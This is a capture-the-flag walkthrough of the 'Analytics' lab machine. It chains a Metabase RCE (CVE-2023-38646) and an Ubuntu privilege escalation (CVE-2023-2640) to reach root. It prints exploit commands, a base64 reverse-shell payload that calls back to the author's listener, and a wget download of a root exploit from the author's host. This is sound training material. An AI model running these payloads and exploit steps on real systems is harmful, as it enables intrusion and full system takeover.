# Analytics Box - Walkthrough by Jack Buchanan

## Introduction:

This is a detailed walkthrough of the "Analytics" machine, demonstrating the steps I took to enumerate, exploit, and escalate privileges to root access.

---

## Enumeration:

As with any CTF challenge, the first step is gathering as much information as possible about the target. I performed a **Nmap** scan to identify open ports and services running on the target machine.

### Nmap Scan Command:

`sudo nmap -sC -sV -sS -n 10.10.11.233`

### Nmap Scan Results:


`PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80/tcp open  http    nginx 1.18.0 (Ubuntu)`

From the scan, two open ports were identified:

- **Port 22 (SSH)**: Running OpenSSH 8.9p1.
- **Port 80 (HTTP)**: Running Nginx 1.18.0 on Ubuntu.

Since SSH was open, I noted it as a potential entry point for later but decided to focus on exploring the web server running on port 80.

---

## Exploring the Web Server:

Navigating to `http://analytical.htb`, I discovered a login page. Interestingly, I noticed that the email parameter on the page didn’t send any HTTP requests, which seemed unusual. To gather more information, I decided to scan the page further with **Nuclei**, a tool for vulnerability scanning, which helped uncover valuable insights.

### Nuclei Scan Command:

`nuclei -u http://data.analytical.htb`

### Nuclei Scan Output:



`[CVE-2023-38646] [http] [critical] http://data.analytical.htb/api/setup/validate [metabase-panel] [http] [info] http://data.analytical.htb/auth/login [v0.46.6]`

The **Nuclei** scan revealed that the server was running **Metabase version 0.46.6**, an open-source business intelligence tool that allows users to create dashboards and charts from various data sources. More importantly, the scan flagged a critical vulnerability, **CVE-2023-38646**, in the `/api/setup/validate` endpoint, which can be exploited for **Remote Code Execution (RCE)** during the Metabase setup process.

---

## Exploit:

### Exploiting CVE-2023-38646:

Upon further research, I found a **Proof of Concept (PoC)** exploit for **CVE-2023-38646** on GitHub. The PoC enabled me to exploit the vulnerability in the Metabase API to achieve RCE.

[Link to PoC Exploit](https://github.com/securezeron/CVE-2023-38646/blob/main/CVE-2023-38646-Reverse-Shell.py)

I executed the exploit with the target address (`http://data.analytical.htb`) and my own listener IP:

### Exploit Command:

`/home/skid/python3/python3/bin/python /home/skid/python3/python3/exploit.py --rhost http://data.analytical.htb --lhost 10.10.14.61 --lport 4444`

### Exploit Output:

`[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties... [DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f [DEBUG] Version: v0.46.6 [DEBUG] Payload = YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjYxLzQ0NDQgMD4mMQ== [DEBUG] Sending request to http://data.analytical.htb/api/setup/validate... [DEBUG] Response received: {"message":"Vector arg to map conj must be a pair"} [DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400`

Despite the failure message (`"Vector arg to map conj must be a pair"`), I was able to manipulate the payload successfully and gained a reverse shell on the system. Once I had access to the shell, I started looking for ways to escalate privileges.

---

## Privilege Escalation

Once inside the machine, I began looking for ways to escalate privileges. The first step was to check the environment variables for any sensitive information.

### Checking Environment Variables

Using the `env` command, I found an interesting environment variable containing credentials:


`env 
META_PASS META_PASS=An4lytics_ds20223#`

This password allowed me to **SSH** into the machine as the `metalytics` user.

### Kernel Version and OS Information

Next, I checked the kernel version and the operating system details:

`uname -r 6.2.0-25-generic`

`lsb_release -a Description:    Ubuntu 22.04.3 LTS`

Given the kernel version and the fact that I was running on Ubuntu 22.04.3, I searched for any relevant privilege escalation vulnerabilities.

### Exploiting CVE-2023-2640 for Privilege Escalation

After some research, I found that the machine was vulnerable to **CVE-2023-2640**. I discovered an exploit on GitHub that could be used to escalate privileges to root.

**Exploit Link**: [CVE-2023-2640 Exploit](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh)

To use the exploit, I hosted it on my local machine using a Python server and downloaded it to the target:

`wget http://10.10.14.61:8000/exploit.sh chmod +x exploit.sh`

I then ran the exploit:

`./exploit.sh`

**Exploit Output**:

`[+] You should be root now [+] Type 'exit' to finish and leave the house cleaned`

The exploit successfully granted me root access!

---

## Root Access

With root access, I was able to retrieve the final flag:

`cat /root/root.txt 0e216a82f5752d038b569096ef342dcb`

---

## Conclusion

This box demonstrated how a critical vulnerability in a widely used open-source tool like Metabase can lead to full system compromise. By chaining enumeration, exploitation of **CVE-2023-38646**, and privilege escalation through **CVE-2023-2640**, I was able to gain root access.